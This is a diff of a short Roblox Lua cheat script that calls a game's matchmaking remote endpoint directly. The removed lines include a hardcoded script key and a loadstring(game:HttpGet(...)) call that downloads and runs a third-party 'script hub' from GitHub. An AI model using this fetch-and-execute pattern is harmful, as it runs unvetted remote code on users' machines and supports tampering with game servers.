@@ -1,16 +1,5 @@
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
+local args = {
+    [1] = "__DAILY_CHALLENGE"
+}
 
-getgenv().join = true
-local function joinMatchmaking()
-    local args = {
-    [1] = "mha_stain"
-    }
-    local success, err = pcall(function()
-        game:GetService("ReplicatedStorage"):WaitForChild("endpoints"):WaitForChild("client_to_server"):WaitForChild("request_matchmaking"):InvokeServer(unpack(args))
-    end)
-end
-wait(1)
-script_key="YjSVgRRTkNtpZdaNGzSqnXUwDZNECNej";
-loadstring(game:HttpGet("https://raw.githubusercontent.com/buang5516/buanghub/main/PremiumBuangHub.lua"))()
+game:GetService("ReplicatedStorage"):WaitForChild("endpoints"):WaitForChild("client_to_server"):WaitForChild("request_matchmaking"):InvokeServer(unpack(args))
